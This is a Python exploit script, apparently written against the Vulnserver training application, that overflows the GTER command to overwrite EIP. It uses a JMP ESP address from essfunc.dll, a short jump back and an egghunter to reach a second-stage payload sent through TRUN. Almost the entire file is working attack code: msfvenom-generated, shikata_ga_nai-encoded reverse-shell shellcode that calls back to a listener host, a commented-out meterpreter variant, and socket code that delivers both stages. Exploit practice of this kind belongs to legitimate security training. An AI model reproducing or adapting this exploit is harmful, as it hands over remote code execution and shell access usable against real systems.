#!/usr/bin/python
# -*- coding: utf-8 -*-
# EIP OVERWRITE W/ EGGHUNTER #

import socket

#JMP ESP in essfunc.dll
offset = "\xaf\x11\x50\x62"

#JMP back into buffer to execute egghunter
jmpback = "\xeb\xb0\x90\x90"
#jmpback = "\xeb\x9c\x90\x90"

# search for W00TW00T \x54\x30\x30\x57
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" + "\x90" * 10

# msfvenom -p windows/shell_reverse_tcp -f py -b "\x00\x0a\x0d" -v shell LHOST=192.168.10.58 LPORT=9998 -v shell -e x86/shikata_ga_nai
#Payload size: 381 bytes including nops
shell =  ""
shell += "\x90" * 30
#shell += "\x83\xec\x3c"
shell += "\xda\xd2\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52\xbe\x30"
shell += "\x8f\x1b\x3a\x83\xc2\x04\x31\x72\x13\x03\x42\x9c\xf9"
shell += "\xcf\x5e\x4a\x7f\x2f\x9e\x8b\xe0\xb9\x7b\xba\x20\xdd"
shell += "\x08\xed\x90\x95\x5c\x02\x5a\xfb\x74\x91\x2e\xd4\x7b"
shell += "\x12\x84\x02\xb2\xa3\xb5\x77\xd5\x27\xc4\xab\x35\x19"
shell += "\x07\xbe\x34\x5e\x7a\x33\x64\x37\xf0\xe6\x98\x3c\x4c"
shell += "\x3b\x13\x0e\x40\x3b\xc0\xc7\x63\x6a\x57\x53\x3a\xac"
shell += "\x56\xb0\x36\xe5\x40\xd5\x73\xbf\xfb\x2d\x0f\x3e\x2d"
shell += "\x7c\xf0\xed\x10\xb0\x03\xef\x55\x77\xfc\x9a\xaf\x8b"
shell += "\x81\x9c\x74\xf1\x5d\x28\x6e\x51\x15\x8a\x4a\x63\xfa"
shell += "\x4d\x19\x6f\xb7\x1a\x45\x6c\x46\xce\xfe\x88\xc3\xf1"
shell += "\xd0\x18\x97\xd5\xf4\x41\x43\x77\xad\x2f\x22\x88\xad"
shell += "\x8f\x9b\x2c\xa6\x22\xcf\x5c\xe5\x2a\x3c\x6d\x15\xab"
shell += "\x2a\xe6\x66\x99\xf5\x5c\xe0\x91\x7e\x7b\xf7\xd6\x54"
shell += "\x3b\x67\x29\x57\x3c\xae\xee\x03\x6c\xd8\xc7\x2b\xe7"
shell += "\x18\xe7\xf9\xa8\x48\x47\x52\x09\x38\x27\x02\xe1\x52"
shell += "\xa8\x7d\x11\x5d\x62\x16\xb8\xa4\xe5\xd9\x95\xac\xcf"
shell += "\xb1\xe7\xb0\x08\x4c\x61\x56\x3c\x40\x27\xc1\xa9\xf9"
shell += "\x62\x99\x48\x05\xb9\xe4\x4b\x8d\x4e\x19\x05\x66\x3a"
shell += "\x09\xf2\x86\x71\x73\x55\x98\xaf\x1b\x39\x0b\x34\xdb"
shell += "\x34\x30\xe3\x8c\x11\x86\xfa\x58\x8c\xb1\x54\x7e\x4d"
shell += "\x27\x9e\x3a\x8a\x94\x21\xc3\x5f\xa0\x05\xd3\x99\x29"
shell += "\x02\x87\x75\x7c\xdc\x71\x30\xd6\xae\x2b\xea\x85\x78"
shell += "\xbb\x6b\xe6\xba\xbd\x73\x23\x4d\x21\xc5\x9a\x08\x5e"
shell += "\xea\x4a\x9d\x27\x16\xeb\x62\xf2\x92\x1b\x29\x5e\xb2"
shell += "\xb3\xf4\x0b\x86\xd9\x06\xe6\xc5\xe7\x84\x02\xb6\x13"
shell += "\x94\x67\xb3\x58\x12\x94\xc9\xf1\xf7\x9a\x7e\xf1\xdd"

# msfvenom -p windows/meterpreter/reverse_ord_tcp -f py -b "\x00\x0a\x0d" -v shell LHOST=192.168.10.58 LPORT=9998 -v shell -e x86/shikata_ga_nai
#Payload size: 120 bytes
#shell =  ""
#shell += "\x90" * 30
#shell += "\xd9\xf6\xd9\x74\x24\xf4\x5a\xbe\x28\x27\x64\xd7\x33"
#shell += "\xc9\xb1\x18\x31\x72\x18\x03\x72\x18\x83\xc2\x2c\xc5"
#shell += "\x91\x2b\x1d\xd2\x3e\x5f\x1e\xd4\x35\x1f\xac\x9f\x1a"
#shell += "\xbc\x27\x8d\x11\xce\x17\x1f\x88\x61\x54\x59\xee\x4f"
#shell += "\x69\x3a\x22\xc5\x62\x4f\x28\x2d\xf7\x15\x91\xa6\x4b"
#shell += "\x93\x91\x33\x1f\x96\x7d\x45\x76\x23\x3c\x1d\x89\xdc"
#shell += "\x34\xec\xb5\x1d\xa5\x0c\xac\x11\x6a\x79\x2f\x40\x8e"
#shell += "\x82\xff\x03\xe6\xbc\x57\x21\xcd\x54\xa5\x36\x16\xab"
#shell += "\x20\xd7\x0b\x04\x3e\x4b\xfd\x3d\x6f\x01\xed\x90\xd8"
#shell += "\x83\xf2\xf6"


firststage = "TRUN ." + "T00WT00W" + shell

#crap = "\x90" * 70 + egghunter + "\x90" * (81 - len(egghunter)) + offset + jmpback + "\x43" * 2243 
crap = "\x41" * (151 - len(egghunter)) 
#crap = "\x90" * 151 + offset + jmpback + "\x43" * 2245

#print "Egghunter Length " + str(len(egghunter))
buffer = "GTER "
buffer+=crap
buffer+=egghunter
buffer+=offset
buffer+="\x90" * 10
buffer+=jmpback

print "[*] Length of egghunter : " + str(len(egghunter))
print "[*] Length of crap variable : " + str(len(crap))
print "[*] Offset : " + str(len(egghunter)) + str(len(crap))

print "[*] Sending evil shenanigans - be patient"
print "[*] First Stage " + str(len(firststage)) + " bytes"
print "[*] Second Stage " + str(len(buffer)) + " bytes to server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.178', 9999))
s.recv(1024)
s.send(firststage)
s.recv(1024)
s.send(buffer)
s.close()
